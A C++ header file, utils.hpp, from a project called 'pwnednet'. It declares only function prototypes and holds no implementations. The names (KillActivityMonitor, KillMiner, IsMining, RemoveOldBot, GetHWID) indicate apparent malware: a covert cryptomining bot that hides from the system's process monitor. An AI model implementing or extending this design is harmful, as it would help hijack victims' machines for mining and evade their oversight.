//
//  utils.hpp
//  pwnednet
//

#pragma once

#include "include.h"

namespace Util
{
    
    pid_t   GetProcessByName(const char *name);
    string  GetHWID();
    int     GetCores();
    
}

void debug(string in);
const char* cstr(string in);
void clear();
bool strpos(string str, string str2);
bool StringToBool(string in);

bool DoesFileExist(const string& name);

bool DoesPIDExist(const char* Program);
void KillProcess(string processname);
void KillActivityMonitor();






bool ShouldKillMiner();
void KillMiner();
bool IsMining();
void RemoveOldBot();

